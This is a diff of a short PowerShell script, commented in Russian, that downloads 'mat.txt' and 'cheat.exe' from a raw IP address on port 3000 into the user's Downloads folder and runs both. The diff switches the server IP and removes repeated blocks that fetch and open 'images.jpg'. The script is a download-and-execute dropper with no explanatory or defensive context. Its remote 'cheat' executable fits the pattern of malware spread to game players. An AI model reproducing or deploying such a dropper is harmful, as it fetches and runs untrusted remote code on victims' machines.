@@ -1,36 +1,11 @@
 # Скачивание и запуск mat.txt
-$uri1 = "http://77.94.203.78:3000/mat.txt"
+$uri1 = "http://91.197.96.30:3000/mat.txt"
 $out1 = "$env:USERPROFILE\Downloads\mat.txt"
 Invoke-WebRequest -Uri $uri1 -OutFile $out1
 Start-Process -FilePath $out1
 
-# Скачивание и открытие images.jpg
-$uri2 = "http://77.94.203.78:3000/images.jpg"
-$out2 = "$env:USERPROFILE\Downloads\images.jpg"
-Invoke-WebRequest -Uri $uri2 -OutFile $out2
-Start-Process -FilePath $out2
-
-# Скачивание и открытие images.jpg
-$uri4 = "http://77.94.203.78:3000/images.jpg"
-$out4 = "$env:USERPROFILE\Downloads\images.jpg"
-Invoke-WebRequest -Uri $uri4 -OutFile $out4
-Start-Process -FilePath $out4
-
-# Скачивание и открытие images.jpg
-$uri5 = "http://77.94.203.78:3000/images.jpg"
-$out5 = "$env:USERPROFILE\Downloads\images.jpg"
-Invoke-WebRequest -Uri $uri5 -OutFile $out5
-Start-Process -FilePath $out5
-
-# Скачивание и открытие images.jpg
-$uri2 = "http://77.94.203.78:3000/images.jpg"
-$out2 = "$env:USERPROFILE\Downloads\images.jpg"
-Invoke-WebRequest -Uri $uri2 -OutFile $out2
-Start-Process -FilePath $out2
-
-
 # Скачивание и запуск cheat.exe
-$uri3 = "http://77.94.203.78:3000/cheat.exe"
+$uri3 = "http://91.197.96.30:3000/cheat.exe"
 $out3 = "$env:USERPROFILE\Downloads\cheat.exe"
 Invoke-WebRequest -Uri $uri3 -OutFile $out3
 Start-Process -FilePath $out3
